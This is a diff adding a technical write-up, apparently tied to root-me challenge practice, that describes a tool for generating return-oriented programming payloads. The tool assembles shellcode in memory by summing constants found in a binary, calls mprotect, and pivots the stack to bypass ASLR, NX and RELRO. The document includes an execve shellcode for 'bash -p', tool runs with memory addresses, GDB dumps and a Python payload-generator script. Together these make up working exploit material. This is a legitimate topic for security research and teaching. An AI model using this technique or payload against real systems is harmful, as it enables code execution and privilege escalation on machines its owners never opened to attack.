@@ -1,0 +1,343 @@
+Return Oriented Programming is at the core of modern exploitation technics, but the automation of the payload generation can be time consuming. My intent was to write a tool which is able to generate a generic enough ROP payload that it worked in all situations. I will present a new method to generate ROP payloads which neither relies on gadgets within the target binary, nor will rely on string copying particular bytes to build the in memory payload.
+
+This means::
+    *. avoiding using any gadgets from the vulnerable binary, but only gadgets from the generated compiler functions
+    *. avoiding GOT dereferencing which requires quite a bit of manual work to chain a payload together
+    *. bypass ASLR, NX and RELRO
+
+I. Selecting linker gadgets
+
+Generally, Linux program .text sections look more or less like this, where the leading and trailing functions are added by the linker:
+    _start()
+    program opcodes
+    __libc_csu_fini()
+    __libc_csu_init()
+    __i686.get_pc_thunk.bx()
+
+I allowed myself gadgets taken only from _start(), __libc_csu_fini(), __libc_csu_init(). I tried to avoid __i686.get_pc_thunk.bx() because it is x86 only but had to in practice. I'm pretty sure I can find a replacement gadget for this on x64 though.
+
+This is the working set of gadgets I had to work with:
+    *. in profiling function: pop ebx ; pop ebp ;;                                                         => This allows me to control ebx
+    *. in profiling function: leave ;;                                                                     => This allows me to pivot the stack to stage 1
+    *. in profiling function: add [ebx+0x5d5b04c4] eax ;;                                                  => This allows me to add eax to a portion of memory
+    *. in __i686.get_pc_thunk.bx(): add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;; => This allows me to add a portion of memory to eax by controlling ebx
+
+II. Overall approach
+
+ The general idea is to create a fake stack in the .data section and transfer execution to it. This will use a standard stack-pivoting technique to transfer exectuion to the fake frame. The fake stack frame will be in charge of changing the memory permission for the particular data region, and then transferring control to the shellcode. It will look like this:
+
+ &mprotect
+ &shellcode
+ start of page
+ size
+ RWE (0x7)
+ shellcode
+
+
+III. The core of the problem
+
+The problem is now to create the preceding stack frame with the gadgets available in I., meaning that we must be able to copy any shellcode using the above gadgets. The constraints are:
+    *. Need to move 32 bits chunks at a time, because all gadgets work with 32 bits.
+    *. No use of strcpy to copy payload from memory since 0x80 (int 0x80) and other opcodes are not guaranteed to be available
+
+    1. Accumulating
+
+The idea here is to use eax (or any register) as a growing accumulator. This means that the value of eax will always grow upwards towards integer.MAX. One the value of eax is of interest (matches a piece of shellcode), we write the value of eax to our fake frame. We then continue growing until the next interesting value is met.
+To achieve this, we cut the shellcode into pieces of 4 bytes and consider each 4 byte chunk as a number. We then sort those numbers in increasing order, and compute the delta between each number. The result of this is an array of positive numbers (referred to as slices), slowly increasing. This helps ensure that eax is always monotically increasing, and avoids having to reset it to a given value before writing the next slice. This set of slices is what we are going to feed eax with, triggering a write to memory each time a a slice value has been added to eax.
+
+    2. Finding numbers
+
+The problem remains of how to find the exact slice number in memory. This is done by scanning a memory region in search for all numbers, and then resolving the "coin change problem".
+The "coin change" problem is simple: given a payment (a note for example), what is the smallest amount of coins which need to be returned back in order to provide the change. In our case, the slice is the amount of change, and the coins are the numbers found in memory. In essence, we try and find the number "slice", using the smallest amount of coins (numbers found in memory). This can be said differently as: "to return a slice, what is the minimal number of operations I need to do on numbers found in memory". There are 2 ways to solve the coin change problem (greedy approach and dynamic programming approach). The greedy approach starts with the highest number inferior or equal to slice, then looks for the next biggest number that can be added to reach slice, and continues that way until slice is reached. This is a sub-optimal approach in some case. Another approach is dynamic programming, which looks for the best combination of numbers (i.e: the least number of operations) to reach slice. This is always optimal, but requires a lot of memory for big numbers.
+
+Example: if we have a slice equal to 0x00001234, and have found the numbers (0x1000, 0x500, 0x200, 0x57 and 0x34) in memory, we can get the value 0x00001234 by adding the numbers together (0x00001000 + 0x200 + 0x34). This is a solution to the coin change problem.
+In practice, I use the "add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;;" gadget to retrieve the numbers at specific memory addresses and then sum them up together in eax. Once the number I am interested in is found (the slice), it is written to the fake stack using: "add [ebx+0x5d5b04c4] eax ;;". The number written at the previous address will be a chunk of shellcode. At the end of the process, we have a shellcode in memory.
+
+    3. Practical example
+
+A further example with this simple "execve(bash -p)" shellcode (taken from shell-storm) on some binary: "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+
+1. Cut the shellcode into 4 byte chunks: "\x6a\x0b\x58\x99", "\x52\x66\x68\x2d", "\x70\x89\xe1\x52", "\x6a\x68\x68\x2f", "\x62\x61\x73\x68", "\x2f\x62\x69\x6e", "\x89\xe3\x52\x51", "\x53\x89\xe1\xcd", "\x80"
+2. Interpret each block as a 32 bit integer
+3. Sort them in increasing order
+4. Compute the difference between each block. This is our array of "slices"
+5. Scan memory for available numbers
+6. For each slice, return the numbers which added together create the slice
+
+Partial commented output from the tool for points 2., 3., 4., 5., 6.:
+
+/home/dahtah/src/numstitch/ropstitch.py -x "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" -n 0x0 -S -m ~/rootme/appsys/hbinary5
+...
+(4, 761816658) 0x2d686652                       => This is block 1 of the above shellcode "\x52\x66\x68\x2d". It can be built by performing 5 add operations using the following numbers. The numbers can be found at these memory locations:
+5 [761556015, 246729, 13568, 340, 6]
+0x08048034 => 0x00000006        6
+0x08048058 => 0x00000154      340
+0x08048158 => 0x2d646c2f 761556015
+0x080482a3 => 0x00003500    13568
+0x08048aa6 => 0x0003c3c9   246729
+(12, 33554968) 0x2000218                        => This is block 3 of the shellcode: "\x6a\x68\x68\x2f". It can be built by adding 0x2000218 (the "slice" value) to block 1 (0x2d686652 + 0x2000218 = 0x2f68686a). The numbers needed to build the slice can be found at the following locations
+2 [33554944, 24]
+0x08048387 => 0x02000200 33554944
+0x08048493 => 0x00000018       24
+Process continues until all shellcode is copied to memory.
+
+By using eax as an accumulator register, we dump the chunks of shellcode on the fake stack, by adding together numbers found in the binary.
+
+IV. Overall process
+
+The tool by default chooses an arbitrary fake stack location in the .data section (which is RW). It then adds a call to mprotect at the beginning of the stack frame. This changes the .data page permission to RWE, and allows execution of the trailing shellcode. A low level GDB view can be seen in appendix 1.
+Once the complete shellcode is copied in memory, control flow is transfered away to our fake stack using stack pivoting (leave;; instruction)
+
+V. Pros and cons
+
+Disadvantages of this technique:
+    *. Creates relatively big payloads. This can be optimised away. Also, if gagdets from within the binary can be used, then the footprint can be lessened.
+    *. Does not work on mprotect() protected systems, such as GRSec kernels
+    *. x86 only for the time being. I cannot see any problems with porting this to x64 systems.
+
+Advantages of this technique:
+    *. Shellcode can contain any character it needs. Since the shellcode is built from numbers, all characters can be built
+    *. Many numbers are available within a binary. The bigger the binary, the more numbers available, better the efficiancy
+    *. Can bypass ASLR + DEP + RELRO, since the GOT is not overwritten, and only .text sections addresses are used
+    *. To some extent, we can bypass character restrictions in the target program, by excluding addresses containing bad chars. Indeed there are often multiple instances of the same numbers within the binary.
+
+V~I Tooling
+
+The tool can automatically generate python code which can be used to generate a fake stack frame in memory with the following elements:
+
+ &mprotect          => found via GOT dereferencing
+ &shellcode     ----|
+ start of page      |
+ size               |
+ RWE (0x7)          |
+ shellcode      <---|
+
+I have created 2 tools
+    1. ropnum.py is able, given a number and a binary, to find the individual numbers which added together create the target number (the slice)
+    2. ropex.py is able, given a shellcode and a binary, to generate a ROP payload (including an mprotect stub)
+    3. A third tool is being written, that given a GOT entry and an offset, will add the mprotect address prior to the fake stake frame
+
+Some part of the toolset are cleaner then others. This is still activework in progress. Sample runs of the program are provided in Appendix 2.
+
+VI. Appendix
+
+    1. Fake stack being built in GDB
+
+0xb7f31e00 is the address of mprotect via GOT dereferencing. A breakpoint is added on the memory write operation to examine the fake stake after each write:
+
+1. Writting 0x7 to our fake stack (mprotect RWE (0x7) flag)
+   0x80485ae <_start+158>:  add    DWORD PTR [ebx+0x5d5b04c4],eax
+=> 0x80485b4 <_start+164>:  ret
+
+gdb-peda$ x/16w 0x804a11c
+0x804a11c:  0xb7f31e00  0x00000000  0x00000000  0x00000000
+0x804a12c:  0x00000007  0x00000000  0x00000000  0x00000000
+0x804a13c:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804a14c:  0x00000000  0x00000000  0x00000000  0x00000000
+
+2. Writting mprotect page size (0x1000). Notice that the numbers are added in growing order:
+0x804a11c:  0xb7f31e00  0x00000000  0x00000000  0x00001000
+0x804a12c:  0x00000007  0x00000000  0x00000000  0x00000000
+0x804a13c:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804a14c:  0x00000000  0x00000000  0x00000000  0x00000000
+
+3. ...
+
+4. later execution (notice the missing parts of shellcode, which will be filed in later, once eax reaches a slice value):
+0x804a11c:  0xb7f31e00  0x0804a130  0x0804a000  0x00001000
+0x804a12c:  0x00000007  0x00000000  0x2d686652  0x52e18970
+0x804a13c:  0x2f68686a  0x68736162  0x6e69622f  0x5152e389
+0x804a14c:  0x00000000  0x00000080  0x00000000  0x00000000
+
+5. end result (The shellcode is complete in memory):
+0x804a11c:  0xb7f31e00  0x0804a130  0x0804a000  0x00001000
+0x804a12c:  0x00000007  0x99580b6a  0x2d686652  0x52e18970
+0x804a13c:  0x2f68686a  0x68736162  0x6e69622f  0x5152e389
+0x804a14c:  0xcde18953  0x00000080  0x00000000  0x00000000
+
+    2. Sample program output
+
+        1. ropnum (find me the easiest way to build the 0xff9 number using the code segment)
+
+dahtah@kali:~/rootme/appsys$ ropnum.py -n 0xff9 -S -s .text ~/rootme/appsys/hbinary5
+Using segments instead of sections to perform number lookups.
+Using sections [.text] for segment lookup.
+Found loadable segment starting at [address 0x08048000, offset 0x00000000]
+Reaching end of data. Skipping last bytes...
+Reaching end of data. Skipping last bytes...
+Reaching end of data. Skipping last bytes...
+Found a solution using 3 operations: [3840, 245, 4]
+0x0804843b => 0x000000f5      245
+0x08048050 => 0x00000004        4
+0x0804818b => 0x00000f00     3840
+
+        2. ropex (generate me a payload for the following shellcode. Include the mprotect frame, and eax initial value is 0xffffffff):
+
+dahtah@kali:~/rootme/appsys$ /home/dahtah/src/numstitch/ropex.py -x "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" -n 0xffffffff -S -p ~/rootme/appsys/hbinary5
+Using segments instead of sections to perform number lookups.
+Using sections [.text] for segment lookup.
+Found loadable segment starting at [address 0x08048000, offset 0x00000000]
+Reaching end of data. Skipping last bytes...
+Reaching end of data. Skipping last bytes...
+Reaching end of data. Skipping last bytes...
+(12, 8L) 0x8L
+1 [8]
+0x080481c4 => 0x00000008        8
+(8, 4089) 0xff9
+3 [3840, 245, 4]
+0x08048050 => 0x00000004        4
+0x0804818b => 0x00000f00     3840
+0x0804843b => 0x000000f5      245
+(4, 134516736) 0x8049000
+3 [134515636, 1048, 52]
+0x0804801c => 0x00000034       52
+0x080487d0 => 0x00000418     1048
+0x080489ce => 0x08048bb4 134515636
+(0, 304) 0x130
+1 [304]
+0x08048124 => 0x00000130      304
+(20, 627295522) 0x2563c522
+8 [611647365, 15205612, 399336, 39148, 3840, 192, 26, 3]
+0x08048054 => 0x00000003        3
+0x0804818b => 0x00000f00     3840
+0x080482d4 => 0x0000001a       26
+0x08048444 => 0x000617e8   399336
+0x08048539 => 0x00e804ec 15205612
+0x080485e8 => 0x000098ec    39148
+0x0804877d => 0x000000c0      192
+0x08048a2a => 0x2474ff85 611647365
+(28, 33554968) 0x2000218
+2 [33554944, 24]
+0x08048387 => 0x02000200 33554944
+0x08048493 => 0x00000018       24
+(40, 569015071) 0x21ea7b1f
+6 [557802866, 10022017, 1179648, 10496, 41, 3]
+0x08048054 => 0x00000003        3
+0x0804822e => 0x00120000  1179648
+0x08048253 => 0x00002900    10496
+0x08048254 => 0x00000029       41
+0x080485e7 => 0x0098ec81 10022017
+0x08048bd1 => 0x213f6572 557802866
+(24, 26125799) 0x18ea5e7
+7 [24963072, 1118208, 39148, 4872, 380, 115, 4]
+0x0804801f => 0x00111000  1118208
+0x08048050 => 0x00000004        4
+0x08048063 => 0x00001308     4872
+0x080480a8 => 0x0000017c      380
+0x08048244 => 0x00000073      115
+0x0804843e => 0x017ce800 24963072
+0x080485e8 => 0x000098ec    39148
+(32, 361879538) 0x1591d7f2
+6 [360710144, 1118208, 49157, 1799, 224, 6]
+0x0804801f => 0x00111000  1118208
+0x08048034 => 0x00000006        6
+0x080480c4 => 0x000000e0      224
+0x08048132 => 0x15800000 360710144
+0x08048410 => 0x00000707     1799
+0x0804877c => 0x0000c005    49157
+(36, 100008141) 0x5f600cd
+6 [99092484, 878953, 34048, 2568, 86, 2]
+0x080480b4 => 0x00000002        2
+0x08048274 => 0x00000056       86
+0x080483b5 => 0x000d6969   878953
+0x080483bb => 0x00008500    34048
+0x080486bc => 0x00000a08     2568
+0x080489d0 => 0x05e80804 99092484
+(48, 572993105L) 0x22272e51L
+7 [557802866, 14682116, 460552, 47359, 192, 19, 1]
+0x08048006 => 0x00000001        1
+0x08048064 => 0x00000013       19
+0x080480c2 => 0x00e00804 14682116
+0x0804840f => 0x00070708   460552
+0x0804877d => 0x000000c0      192
+0x080489e3 => 0x0000b8ff    47359
+0x08048bd1 => 0x213f6572 557802866
+(16, 147290858L) 0x8c77aeaL
+7 [141035524, 6094848, 132872, 27392, 192, 26, 4]
+0x08048050 => 0x00000004        4
+0x08048283 => 0x00006b00    27392
+0x080482c2 => 0x005d0000  6094848
+0x080482d4 => 0x0000001a       26
+0x080483e7 => 0x00020708   132872
+0x08048470 => 0x08680804 141035524
+0x0804877d => 0x000000c0      192
+(44, 881425897L) 0x34897de9L
+7 [875902208, 5269512, 246729, 6788, 519, 133, 8]
+0x080481c4 => 0x00000008        8
+0x080483bc => 0x00000085      133
+0x080483e8 => 0x00000207      519
+0x08048501 => 0x00506808  5269512
+0x08048543 => 0x00001a84     6788
+0x08048aa6 => 0x0003c3c9   246729
+0x08048aeb => 0x34353500 875902208
+
+# This will generate the real payload for you.
+import struct
+
+class GadgetAction():
+  ADD = 0x1
+  MOVE = 0x2
+  POP = 0x3
+
+class PayloadGenerator():
+
+  # Address of ppr gadget
+  ppr_addr = PPR_ADDR
+  # Address of mem to reg gadget
+  add_mem_to_reg = ADD_MEM_TO_REG
+  # Address of reg to mem gadget
+  add_reg_to_mem = ADD_REG_TO_MEM
+
+  def __init__(self):
+    pass
+
+  def ppr(self, addr, action):
+    ppr_str = ""
+    if (action == GadgetAction.ADD):
+      ppr_str += struct.pack("<I", self.ppr_addr)
+      ppr_str += struct.pack("<I", addr)
+      ppr_str += struct.pack("<I", 0x44444444)
+    elif (action == GadgetAction.MOVE):
+      ppr_str += struct.pack("<I", self.ppr_addr)
+      ppr_str += struct.pack("<I", addr)
+      ppr_str += struct.pack("<I", 0x61616161)
+    elif (action == GadgetAction.POP):
+      ppr_str += struct.pack("<I", self.ppr_addr)
+      ppr_str += struct.pack("<I", 0x68686868)
+      ppr_str += struct.pack("<i", addr)
+    else:
+      raise NotImplementedError("No corresponding action found")
+    return ppr_str
+
+  def add_to_reg_from_mem(self):
+    add_str = struct.pack("<I", self.add_mem_to_reg)
+    return add_str
+
+  def add_to_mem_from_reg(self):
+    add_str = struct.pack("<I", self.add_reg_to_mem)
+    return add_str
+
+pg = PayloadGenerator()
+
+payload = ""
+payload += pg.ppr(0x80481c4, GadgetAction.ADD)
+payload += pg.add_to_reg_from_mem()
+payload += pg.ppr(0x804a12c, GadgetAction.MOVE)
+payload += pg.add_to_mem_from_reg()
+payload += pg.ppr(0x8048050, GadgetAction.ADD)
+payload += pg.add_to_reg_from_mem()
+payload += pg.ppr(0x804818b, GadgetAction.ADD)
+payload += pg.add_to_reg_from_mem()
+payload += pg.ppr(0x804843b, GadgetAction.ADD)
+payload += pg.add_to_reg_from_mem()
+payload += pg.ppr(0x804a128, GadgetAction.MOVE)
+payload += pg.add_to_mem_from_reg()
+# Output removed...
+payload += pg.ppr(0x804a14c, GadgetAction.MOVE)
+payload += pg.add_to_mem_from_reg()
+# Leave ret for stack pivoting
+payload += pg.ppr(0x804a120 - 0x8, GadgetAction.POP)
+payload += struct.pack("<I", 0x8048449)
+# Accumulator register has a final value of: 3454110035 => 0xcde18953
+
+
